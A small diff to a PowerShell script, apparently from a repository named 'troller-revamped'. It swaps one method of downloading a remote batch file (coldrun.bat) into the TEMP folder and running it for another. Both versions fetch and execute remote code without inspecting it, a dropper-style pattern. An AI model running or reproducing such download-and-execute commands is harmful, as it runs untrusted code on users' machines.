@@ -1,5 +1,6 @@
-# Define the command to download and run the batch script
-$command = 'cmd /c curl -s "https://raw.githubusercontent.com/vexnity/troller-revamped/main/coldrun.bat" > "$env:TEMP\coldrun.bat" && "$env:TEMP\coldrun.bat"'
+# Define the URL of the batch script
+$batchScriptUrl = "https://raw.githubusercontent.com/vexnity/troller-revamped/main/coldrun.bat"
 
-# Execute the command
-Invoke-Expression -Command $command
+# Download the batch script and execute it
+Invoke-WebRequest -Uri $batchScriptUrl -OutFile "$env:TEMP\coldrun.bat"
+Start-Process -FilePath "$env:TEMP\coldrun.bat"
